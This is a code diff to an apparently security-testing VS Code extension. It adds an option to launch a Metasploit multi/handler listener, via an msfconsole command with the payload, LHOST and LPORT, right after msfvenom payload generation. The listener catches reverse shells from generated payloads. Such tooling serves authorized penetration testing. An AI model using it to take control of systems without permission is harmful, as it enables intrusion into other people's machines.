@@ -158,6 +158,19 @@ export let msfvenomPayloadCreation: callback = async (args) => {
     return;
   }
 
+  let runHandler: boolean = false;
+  logger.info("ask startListen?")
+  if (!args || !args.startListen) {
+    let select = await vscode.window.showQuickPick(["Yes", "No"], {
+      placeHolder: "Do you want to start the listener?",
+    });
+    if (select === "Yes") {
+      runHandler = true;
+    }
+  } else {
+    runHandler = args.startListen;
+  }
+
   let argsArray: string[] = [
     msfconsolePath,
     "-p",
@@ -172,4 +185,14 @@ export let msfvenomPayloadCreation: callback = async (args) => {
   ];
 
   CreateTaskLikeInteractiveTerminal("msfvneom payload creation", argsArray);
+
+  logger.info("start generating msfvenom payload");
+  if(runHandler) {
+    CreateTaskLikeInteractiveTerminal("msfvenom handler", [
+      "msfconsole",
+      "-x",
+      `'use exploit/multi/handler; set payload ${payload}; set LHOST ${lhost}; set LPORT ${lport}; run -j'`,
+    ]);
+    logger.info("start generating msfvenom handler");
+  }
 };
